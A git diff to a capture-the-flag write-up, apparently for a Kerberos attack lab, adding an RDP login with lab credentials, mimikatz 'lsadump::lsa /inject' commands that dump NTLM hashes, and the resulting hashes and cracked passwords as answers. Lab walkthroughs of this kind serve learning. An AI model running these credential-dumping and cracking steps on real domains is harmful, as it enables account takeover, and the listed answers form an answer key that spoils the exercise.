@@ -119,8 +119,6 @@ hashcat -a 0 -m 13100 hash.txt Pass.txt
 
 #### What is the HTTPService Password?
 
-
-
 {% hint style="success" %}
 `Summer2020`
 {% endhint %}
@@ -180,14 +178,31 @@ hashcat -a 0 -m 18200 hash.txt Pass.txt
 
 ## Task 7 Golden/Silver Ticket Attacks w/ mimikatz
 
+```bash
+xfreerdp /v:controller.local /u:administrator /p:'P@$$W0rd' /cert-ignore \
+         +clipboard /dynamic-resolution /drive:share,/tmp
+```
+
 #### What is the SQLService NTLM Hash?
 
-{% hint style="success" %}
+```bash
+lsadump::lsa /inject /name:SQLService
+```
 
+![](<../../.gitbook/assets/Screenshot from 2022-03-28 19-57-59.png>)
+
+{% hint style="success" %}
+`cd40c9ed96265531b21fc5b1dafcfb0a`
 {% endhint %}
 
 #### What is the Administrator NTLM Hash?
 
-{% hint style="success" %}
+```bash
+lsadump::lsa /inject /name:Administrator
+```
 
+![](<../../.gitbook/assets/Screenshot from 2022-03-28 19-58-17.png>)
+
+{% hint style="success" %}
+`2777b7fec870e04dda00cd7260f7bee6`
 {% endhint %}
